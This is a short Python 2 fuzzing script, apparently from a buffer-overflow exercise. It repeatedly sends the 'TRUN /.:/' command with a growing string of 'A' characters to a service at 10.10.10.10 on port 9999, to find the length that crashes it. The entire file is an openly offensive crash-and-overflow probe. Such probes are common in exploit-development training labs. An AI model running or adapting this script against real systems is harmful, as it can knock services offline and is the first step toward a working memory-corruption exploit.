#!/usr/bin/python
#Adapted by Thiago Mendes da Silva
import socket, sys, time
from struct import *

rhost = '10.10.10.10'
rport = 9999
size = 1000

while True:
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((rhost,rport))
    print s.recv(1024)
    buffer = 'A' * size
    s.send('TRUN /.:/'+ buffer + '\r\n')
    print s.recv(2048)
    s.close()
    print 'Buffer size: ' + str(size)
    size += 100
